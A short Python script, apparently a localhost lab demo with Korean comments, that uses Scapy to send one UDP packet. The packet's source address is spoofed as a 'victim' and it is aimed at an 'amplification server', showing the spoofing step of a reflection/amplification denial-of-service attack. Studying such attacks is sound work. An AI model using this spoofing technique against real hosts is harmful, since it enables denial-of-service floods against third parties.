from scapy.all import *

ip = IP(src="127.0.0.2", dst="127.0.0.1")     # 출발지: 피해자(위조), 목적지: 증폭서버
udp = UDP(sport=12345, dport=9999)           # 임의 포트 사용
payload = "Hello Amplify!\n"
pkt = ip/udp/payload

send(pkt, verbose=1)